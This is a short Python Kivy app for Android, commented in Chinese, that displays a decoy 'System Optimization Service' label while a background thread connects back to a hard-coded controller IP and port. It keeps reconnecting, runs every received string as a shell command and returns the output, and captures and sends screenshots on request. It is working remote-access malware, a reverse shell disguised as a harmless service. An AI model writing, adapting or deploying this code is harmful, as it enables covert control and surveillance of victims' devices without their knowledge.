import socket
import subprocess
import threading
import os
from kivy.app import App
from kivy.uix.label import Label

class RemoteApp(App):
    def build(self):
        # 这里的 IP 必须是你 Termux 的 wlan0 IP
        self.MASTER_IP = "192.168.1.10"
        self.MASTER_PORT = 9999
        
        threading.Thread(target=self.connect_to_master, daemon=True).start()
        return Label(text="System Optimization Service\nRunning in background...")

    def connect_to_master(self):
        while True: # 掉线自动重连
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect((self.MASTER_IP, self.MASTER_PORT))
                
                while True:
                    data = client.recv(1024).decode('utf-8')
                    if not data or data == 'exit': break
                    
                    if data == 'screenshot':
                        # 执行截图：注意，这通常需要 Root 权限或在某些系统上受限
                        # 截图保存到 App 私有目录
                        path = "/data/local/tmp/screen.png" 
                        subprocess.run(f"screencap -p {path}", shell=True)
                        
                        if os.path.exists(path):
                            with open(path, "rb") as f:
                                client.sendall(f.read())
                            os.remove(path)
                        # 发送结束标志
                        client.sendall(b"DONE_TRANSFER")
                    
                    else:
                        # 执行普通 shell 命令（如 ls, cd, getprop 等）
                        proc = subprocess.Popen(data, shell=True, 
                                              stdout=subprocess.PIPE, 
                                              stderr=subprocess.PIPE)
                        res = proc.stdout.read() + proc.stderr.read()
                        client.send(res if res else b"Command executed.\n")
            except:
                import time
                time.sleep(5) # 失败后5秒重连

if __name__ == '__main__':
    RemoteApp().run()
